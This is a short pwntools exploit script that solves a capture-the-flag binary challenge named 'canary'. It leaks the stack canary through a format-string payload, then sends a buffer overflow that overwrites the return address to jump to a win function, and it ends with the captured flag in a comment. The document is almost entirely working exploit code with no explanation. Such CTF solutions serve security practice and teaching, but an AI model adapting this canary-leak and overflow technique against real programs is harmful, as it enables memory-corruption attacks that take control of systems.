from pwn import *

BINARY = './canary'
HOST = 'shell.actf.co'
PORT = 20701

context.terminal = ['tmux', 'split-w']

def start():
    if not args.REMOTE:
        print "LOCAL PROCESS"
        return process(BINARY)
    if not args.REMOTE and args.GDB:
        gdb.attach(process(BINARY))
    else:
        print "REMOTE PROCESS"
        return remote(HOST, PORT)



p = start()
if args.GDB:
    gdb.attach(p, 'b *0x400936')

print(p.recvuntil("What's your name? "))


canary = '%17$p'
flag = p64(0x400787)

p.sendline(canary)
result = p.recvuntil("tell me?")
print(result)
leak = hex(int(result[18:36], 16))
print("Canary: " + str(leak))




exploit = 'A'*0x38 + p64(int(leak, 16)) + flag + flag

p.sendline(exploit)
print(p.recvline())

# actf{youre_a_canary_killer_>:(}
